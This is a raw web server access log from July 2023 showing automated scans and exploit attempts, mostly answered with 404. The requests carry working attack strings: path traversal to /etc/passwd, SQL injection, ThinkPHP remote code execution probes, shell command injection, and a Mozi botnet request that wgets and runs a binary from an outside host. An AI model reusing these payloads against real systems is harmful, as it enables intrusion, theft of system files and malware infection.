192.46.218.18 - - [26/Jul/2023:15:59:41 +0900] "CONNECT www.cloudflare.com:443 HTTP/1.1" 400 157 "-" "-"
172.245.228.109 - - [26/Jul/2023:16:20:25 +0900] "POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
213.109.202.66 - - [26/Jul/2023:19:23:29 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.245.228.109 - - [26/Jul/2023:20:38:57 +0900] "GET /forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27 HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
172.245.228.109 - - [26/Jul/2023:20:41:42 +0900] "GET /plugins/3rdPartyServers/ox3rdPartyServers/max.class.php?0=id HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
172.245.228.109 - - [26/Jul/2023:21:01:37 +0900] "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36"
153.231.227.194 - - [26/Jul/2023:21:11:47 +0900] "GET /webapi/entry.cgi?api=SYNO.Core.Desktop.UIString&version=1&method=getjs HTTP/1.1" 404 4611 "-" "Mozilla/5.0 zgrab/0.x"
153.231.227.194 - - [26/Jul/2023:21:11:47 +0900] "GET /webapi/entry.cgi?api=SYNO.Core.Desktop.SessionData&version=1&method=getjs HTTP/1.1" 404 4611 "-" "Mozilla/5.0 zgrab/0.x"
153.231.227.194 - - [26/Jul/2023:21:11:47 +0900] "GET /webapi/entry.cgi?api=SYNO.Core.Desktop.UIString&version=1&method=getjs HTTP/1.1" 404 4611 "-" "Mozilla/5.0 zgrab/0.x"
153.231.227.194 - - [26/Jul/2023:21:11:47 +0900] "GET /webapi/entry.cgi?api=SYNO.Core.Desktop.SessionData&version=1&method=getjs HTTP/1.1" 404 4611 "-" "Mozilla/5.0 zgrab/0.x"
172.245.228.109 - - [26/Jul/2023:23:08:50 +0900] "GET /enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
213.109.202.66 - - [26/Jul/2023:23:28:39 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
172.245.228.109 - - [27/Jul/2023:00:37:45 +0900] "GET /wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(4)))HQYx) HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:04:47:51 +0900] "GET /rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
213.109.202.66 - - [27/Jul/2023:06:35:13 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:07:48:08 +0900] "POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36"
115.50.222.42 - - [27/Jul/2023:08:45:09 +0900] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 12981 "-" "-"
185.224.128.151 - - [27/Jul/2023:12:21:48 +0900] "CONNECT www.apple.com:443 HTTP/1.1" 400 157 "-" "-"
172.245.228.109 - - [27/Jul/2023:14:56:08 +0900] "GET /wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:14:59:38 +0900] "POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:14:59:51 +0900] "POST /nacos/v1/cs/configs?dataId=nacos.cfg.dataIdfoo&group=foo&content=helloWorld HTTP/1.1" 404 4611 "-" "Nacos-Server"
213.109.202.66 - - [27/Jul/2023:15:12:24 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:17:16:34 +0900] "GET /i3geo/exemplos/codemirror.php?pagina=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:17:58:30 +0900] "GET /wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:18:49:46 +0900] "GET /nette.micro/?callback=shell_exec&cmd=cat%20/etc/passwd&what=-1 HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36"
122.239.103.139 - - [27/Jul/2023:19:03:56 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://122.239.103.139:48742/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 12981 "-" "Hello, world"
172.245.228.109 - - [27/Jul/2023:19:28:59 +0900] "GET /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
172.245.228.109 - - [27/Jul/2023:19:49:54 +0900] "GET /forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6) HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
172.245.228.109 - - [27/Jul/2023:20:31:30 +0900] "POST /?rest_route=/notificationx/v1/analytics HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
153.231.227.194 - - [27/Jul/2023:20:40:07 +0900] "GET /webapi/entry.cgi?api=SYNO.Core.Desktop.UIString&version=1&method=getjs HTTP/1.1" 404 4611 "-" "Mozilla/5.0 zgrab/0.x"
153.231.227.194 - - [27/Jul/2023:20:40:07 +0900] "GET /webapi/entry.cgi?api=SYNO.Core.Desktop.SessionData&version=1&method=getjs HTTP/1.1" 404 4611 "-" "Mozilla/5.0 zgrab/0.x"